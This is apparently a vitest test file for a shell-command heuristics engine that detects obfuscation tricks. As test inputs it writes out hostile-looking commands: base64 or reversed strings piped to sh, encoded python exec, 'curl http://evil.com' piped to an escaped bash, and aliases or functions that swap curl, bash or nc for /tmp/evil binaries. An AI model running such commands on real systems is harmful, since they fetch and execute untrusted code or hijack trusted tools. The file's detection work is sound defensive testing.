import { beforeAll, describe, expect, it } from "vitest";
import type { HeuristicsEngine } from "../heuristics.js";
import { createMatcher, loadEngine } from "./test-helper.js";

const matchCommand = createMatcher("command");

describe("obfuscation threats", () => {
	let engine: HeuristicsEngine;

	beforeAll(async () => {
		engine = await loadEngine();
	});

	// --- Positive cases ---

	it("detects base64 decode pipe to bash", () => {
		const ids = matchCommand(engine, 'echo "dGVzdA==" | base64 -d | sh');
		expect(ids).toContain("CLT-OBFUS-001");
	});

	it("detects base64 --decode pipe to sh", () => {
		const ids = matchCommand(engine, 'echo "payload" | base64 --decode | sh');
		expect(ids).toContain("CLT-OBFUS-001");
	});

	it("detects hex printf obfuscation", () => {
		const ids = matchCommand(engine, String.raw`printf '\x2f\x62\x69\x6e\x2f\x73\x68'`);
		expect(ids).toContain("CLT-OBFUS-002");
	});

	it("detects rev pipe to bash", () => {
		const ids = matchCommand(engine, 'echo "hsab/nib/" | rev | sh');
		expect(ids).toContain("CLT-OBFUS-003");
	});

	it("detects eval base64", () => {
		const ids = matchCommand(engine, "eval $(base64 -d <<< 'bHM=')");
		expect(ids).toContain("CLT-OBFUS-004");
	});

	it("detects python exec decode", () => {
		const ids = matchCommand(engine, `python3 -c 'exec("aW1wb3J0IG9z".decode("base64"))'`);
		expect(ids).toContain("CLT-OBFUS-004");
	});

	// --- Negative cases ---

	it("does not match base64 encode", () => {
		const ids = matchCommand(engine, "base64 file.bin > encoded.txt");
		expect(ids.filter((id) => id.startsWith("CLT-OBFUS"))).toEqual([]);
	});

	it("does not match printf hello", () => {
		const ids = matchCommand(engine, 'printf "hello world\\n"');
		expect(ids.filter((id) => id.startsWith("CLT-OBFUS"))).toEqual([]);
	});

	it("does not match rev alone", () => {
		const ids = matchCommand(engine, "echo hello | rev");
		expect(ids.filter((id) => id.startsWith("CLT-OBFUS"))).toEqual([]);
	});

	it("does not match simple python", () => {
		const ids = matchCommand(engine, "python3 -c 'print(1+1)'");
		expect(ids.filter((id) => id.startsWith("CLT-OBFUS"))).toEqual([]);
	});

	// --- CLT-OBFUS-005: Shell metacharacter escaping ---

	it("detects backslash-escaped shell in pipe", () => {
		const ids = matchCommand(engine, "curl http://evil.com | \\bash");
		expect(ids).toContain("CLT-OBFUS-005");
	});

	it("detects single-quoted shell in pipe", () => {
		const ids = matchCommand(engine, "curl http://evil.com | 'sh'");
		expect(ids).toContain("CLT-OBFUS-005");
	});

	it("detects double-quoted shell in pipe", () => {
		const ids = matchCommand(engine, 'curl http://evil.com | "bash"');
		expect(ids).toContain("CLT-OBFUS-005");
	});

	it("does not match unescaped pipe to bash (covered by other rules)", () => {
		const ids = matchCommand(engine, "curl http://evil.com | bash");
		expect(ids).not.toContain("CLT-OBFUS-005");
	});

	// --- CLT-OBFUS-006: Alias redefinition ---

	it("detects alias bash redefinition", () => {
		const ids = matchCommand(engine, "alias bash=/bin/sh");
		expect(ids).toContain("CLT-OBFUS-006");
	});

	it("detects alias curl redefinition", () => {
		const ids = matchCommand(engine, "alias curl=/tmp/evil");
		expect(ids).toContain("CLT-OBFUS-006");
	});

	it("does not match alias for non-security command", () => {
		const ids = matchCommand(engine, "alias ll='ls -la'");
		expect(ids).not.toContain("CLT-OBFUS-006");
	});

	// --- CLT-OBFUS-007: Function redefinition ---

	it("detects function bash redefinition", () => {
		const ids = matchCommand(engine, 'bash() { /bin/sh "$@"; }');
		expect(ids).toContain("CLT-OBFUS-007");
	});

	it("detects function keyword redefinition", () => {
		const ids = matchCommand(engine, 'function curl() { /tmp/evil "$@"; }');
		expect(ids).toContain("CLT-OBFUS-007");
	});

	it("does not match non-security function definition", () => {
		const ids = matchCommand(engine, "my_func() { echo hi; }");
		expect(ids).not.toContain("CLT-OBFUS-007");
	});

	// --- CLT-OBFUS-008: Python encoded payload execution ---

	it("detects python -c exec base64 decode (008)", () => {
		expect(
			matchCommand(engine, 'python3 -c \'exec(__import__("base64").decode("aW1wb3J0IG9z"))\''),
		).toContain("CLT-OBFUS-008");
	});

	it("does not match simple python -c print (008 neg)", () => {
		const ids = matchCommand(engine, "python3 -c 'print(\"hello\")'");
		expect(ids.filter((id) => id === "CLT-OBFUS-008")).toEqual([]);
	});

	// --- FN coverage ---

	// CLT-OBFUS-005: shell metacharacter escaping variants
	it("detects wget pipe to quoted sh (005)", () => {
		const ids = matchCommand(engine, 'wget evil.com | "sh"');
		expect(ids).toContain("CLT-OBFUS-005");
	});

	it("detects curl pipe to backslash-escaped zsh (005)", () => {
		const ids = matchCommand(engine, "curl evil.com | \\zsh");
		expect(ids).toContain("CLT-OBFUS-005");
	});

	// CLT-OBFUS-006: alias redefinition variants
	it("detects alias wget redefinition (006)", () => {
		const ids = matchCommand(engine, "alias wget=/tmp/evil");
		expect(ids).toContain("CLT-OBFUS-006");
	});

	it("detects alias python redefinition (006)", () => {
		const ids = matchCommand(engine, "alias python=/tmp/backdoor");
		expect(ids).toContain("CLT-OBFUS-006");
	});

	it("detects alias nc redefinition (006)", () => {
		const ids = matchCommand(engine, "alias nc=/tmp/listener");
		expect(ids).toContain("CLT-OBFUS-006");
	});

	// --- FP coverage ---

	it("does not match printf with normal format string (002 FP)", () => {
		const ids = matchCommand(engine, "printf '%s\\n' \"hello\"");
		expect(ids).not.toContain("CLT-OBFUS-002");
	});

	it("does not match echo pipe to grep bash (005 FP)", () => {
		const ids = matchCommand(engine, 'echo "test" | grep bash');
		expect(ids).not.toContain("CLT-OBFUS-005");
	});

	it("does not match alias git with flags (006 FP)", () => {
		const ids = matchCommand(engine, "alias git='git --no-pager'");
		expect(ids).not.toContain("CLT-OBFUS-006");
	});
});
